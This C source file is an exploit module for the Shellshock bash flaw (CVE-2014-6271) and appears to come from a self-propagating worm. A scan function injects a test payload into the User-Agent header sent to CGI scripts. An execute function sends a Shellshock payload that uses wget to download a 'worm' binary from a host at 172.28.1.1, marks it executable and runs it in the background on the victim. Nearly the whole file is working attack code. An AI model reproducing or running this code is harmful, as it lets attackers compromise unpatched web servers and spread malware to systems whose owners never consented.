#include "cve_2014_6271.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

// HTTP request helper (shared utility for this CVE)
static int send_http_request(const char* ip, int port, const char* path, 
                            const char* user_agent, char* response, size_t response_size) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }
    
    // Build HTTP request
    char request[2048];
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, ip, port, user_agent);
    
    // Send request
    if (send(sock, request, strlen(request), 0) < 0) {
        close(sock);
        return -1;
    }
    
    // Read response
    ssize_t total = 0;
    ssize_t n;
    while ((n = recv(sock, response + total, response_size - total - 1, 0)) > 0) {
        total += n;
        if (total >= (ssize_t)(response_size - 1)) break;
    }
    response[total] = '\0';
    
    close(sock);
    return 0;
}

// CVE-2014-6271 (Shellshock) Scan Handler
cve_scan_result_t cve_2014_6271_scan(const char* target_ip) {
    cve_scan_result_t result = {0};
    result.cve_id = CVE_2014_6271;
    
    // Test for Shellshock vulnerability
    // Send HTTP request with Shellshock payload in User-Agent header
    char response[4096];
    const char* payload = "() { :; }; echo VULNERABLE";
    
    // Try primary endpoint
    if (send_http_request(target_ip, 80, "/cgi-bin/status.cgi", payload, response, sizeof(response)) == 0) {
        if (strstr(response, "VULNERABLE") != NULL) {
            result.is_vulnerable = 1;
            result.confidence = 8;
            result.port_open = 80;
            strncpy(result.service_type, "HTTP", sizeof(result.service_type) - 1);
            return result;
        }
    }
    
    // Try alternative endpoint
    if (send_http_request(target_ip, 80, "/cgi-bin/test.cgi", payload, response, sizeof(response)) == 0) {
        if (strstr(response, "VULNERABLE") != NULL) {
            result.is_vulnerable = 1;
            result.confidence = 7;
            result.port_open = 80;
            strncpy(result.service_type, "HTTP", sizeof(result.service_type) - 1);
            return result;
        }
    }
    
    // Not vulnerable
    result.is_vulnerable = 0;
    result.confidence = 3;
    result.port_open = 0;
    result.service_type[0] = '\0';
    
    return result;
}

// CVE-2014-6271 (Shellshock) Execution Handler
int cve_2014_6271_execute(const char* target_ip) {
    // Build Shellshock payload to download and execute worm
    // In a real scenario, you'd need to host the worm somewhere accessible
    const char* worm_url = "http://172.28.1.1/worm";
    const char* remote_path = "/tmp/worm";
    
    // Build payload: download worm, make executable, execute in background
    char payload[1024];
    snprintf(payload, sizeof(payload),
        "() { :; }; /bin/bash -c 'wget -q -O %s %s 2>/dev/null; chmod +x %s 2>/dev/null; nohup %s > /tmp/worm.log 2>&1 &'",
        remote_path, worm_url, remote_path, remote_path);
    
    // Try primary endpoint
    char response[4096];
    if (send_http_request(target_ip, 80, "/cgi-bin/status.cgi", payload, response, sizeof(response)) == 0) {
        return 1;  // Success
    }
    
    // Try alternative endpoint
    if (send_http_request(target_ip, 80, "/cgi-bin/test.cgi", payload, response, sizeof(response)) == 0) {
        return 1;  // Success
    }
    
    return 0;  // Failure
}

